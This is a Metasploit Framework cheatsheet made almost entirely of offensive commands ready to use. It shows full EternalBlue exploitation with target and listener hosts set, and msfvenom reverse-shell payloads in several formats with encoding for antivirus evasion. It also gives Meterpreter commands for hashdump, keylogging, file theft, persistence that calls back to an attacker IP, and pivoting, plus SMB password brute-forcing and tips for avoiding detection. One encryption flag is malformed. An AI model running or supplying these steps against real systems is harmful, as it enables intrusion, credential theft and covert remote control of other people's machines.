# Metasploit Framework Cheatsheet

## Quick Reference

### Starting Metasploit

```bash
# Start msfconsole
msfconsole

# Start with database
sudo msfdb run

# Initialize database
sudo msfdb init

# Check database status
msf6 > db_status
```

### Searching Modules

```bash
# Search exploits
msf6 > search type:exploit platform:windows smb
msf6 > search ms17_010
msf6 > search eternalblue

# Search auxiliary modules
msf6 > search type:auxiliary scanner
msf6 > search type:auxiliary scanner smb

# Search payloads
msf6 > search type:payload windows/meterpreter
```

### Using Exploits

```bash
# Select exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# View options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set options
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.50
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444

# Run exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

### Payload Generation (msfvenom)

```bash
# Windows Meterpreter EXE
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o payload.exe

# Windows Meterpreter DLL
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o payload.dll

# Windows Meterpreter Shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shellcode.bin

# Linux ELF
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o payload.elf

# PHP Meterpreter
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shell.php

# PowerShell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f psh -o payload.ps1

# Encoded payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
```

### Meterpreter Commands

```bash
# System information
sysinfo
getuid
getpid
getprivs

# File operations
download C:\Users\target\file.txt
upload /path/to/payload.exe C:\temp\
ls C:\Users
cat C:\Users\target\file.txt
mkdir C:\temp

# Process operations
ps
migrate <pid>
kill <pid>
execute -f cmd.exe -i -H

# Network operations
ipconfig
route
arp
netstat
ifconfig

# Privilege escalation
getsystem
hashdump
samdump

# Persistence
run persistence -U -i 5 -p <PORT> -r <IP>
run persistence -X -i 10 -p <PORT> -r <IP>

# Pivoting
portfwd add -l 8080 -p 80 -r 10.0.0.1
portfwd delete -l 8080 -p 80 -r 10.0.0.1
portfwd list

# Screenshot
screenshot

# Keylogger
keyscan_start
keyscan_dump
keyscan_stop

# Shell
shell
execute -f cmd.exe -i
```

### Session Management

```bash
# List sessions
sessions
sessions -l

# Interact with session
sessions -i <session_id>

# Background session
background

# Kill session
sessions -k <session_id>

# Upgrade shell to Meterpreter
sessions -u <session_id>

# Session options
sessions -v
```

### Auxiliary Modules

```bash
# SMB scanner
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# SSH scanner
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# HTTP scanner
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
run

# SMB login
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.50
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

### Pivoting

```bash
# Set up route
run autoroute -s 10.0.0.0/24

# SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 1080
run

# Port forwarding
portfwd add -l 8080 -p 80 -r 10.0.0.1
portfwd list
portfwd delete -l 8080 -p 80 -r 10.0.0.1
```

### Database Operations

```bash
# Hosts
hosts
hosts -S windows
hosts -d 192.168.1.0/24

# Services
services
services -p 445
services -s smb

# Vulnerabilities
vulns

# Credentials
creds

# Loot
loot

# Notes
notes
notes -a "Found admin account"
```

### Resource Files

```bash
# Create resource file (commands.rc):
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.50
set LHOST 192.168.1.100
exploit

# Run resource file
msf6 > resource commands.rc

# Generate and run
msfconsole -r commands.rc
```

### Automation

```bash
# Batch execution
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.50; set LHOST 192.168.1.100; exploit"

# Background processing
nohup msfconsole -r commands.rc > output.log 2>&1 &
```

### OPSEC Tips

```bash
# Use encrypted payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> - encrypt aes256 -f exe -o encrypted.exe

# Use stealthy scanners
use auxiliary/scanner/portscan/syn
set RHOSTS 192.168.1.0/24
set THREADS 1
run

# Use malleable C2 profiles
# Configure in handler options

# Monitor for detection
setg LogLevel 3
```

### Common Modules

```bash
# EternalBlue
use exploit/windows/smb/ms17_010_eternalblue

# BlueKeep
use exploit/windows/rdp/bluekeep_rdp

# SMBGhost
use exploit/windows/smb/cve_2020_0796_smbghost

# Log4Shell
use exploit/multi/http/log4shell_header_injection

# ProxyShell
use exploit/windows/http/exchange_proxyshell_rce

# PrintNightmare
use exploit/windows/dcerpc/cve_2021_1675_printnightmare
```

### Handler Setup

```bash
# Start multi-handler
use exploit/multi/handler

# Set payload
set payload windows/meterpreter/reverse_tcp

# Configure
set LHOST 192.168.1.100
set LPORT 4444

# Run handler
exploit
```

### Database Setup

```bash
# Initialize database
sudo msfdb init

# Start database
sudo msfdb start

# Check status
sudo msfdb status

# Connect in msfconsole
msf6 > db_connect
msf6 > db_status
```

### Troubleshooting

```bash
# Database not connecting
sudo systemctl status postgresql
sudo msfdb reinit

# Exploit fails
# Check: target vulnerability, network connectivity, payload compatibility

# Meterpreter session drops
# Check: network stability, session timeout, payload type

# msfvenom payload detected
# Check: encoding, obfuscation, target defenses
```
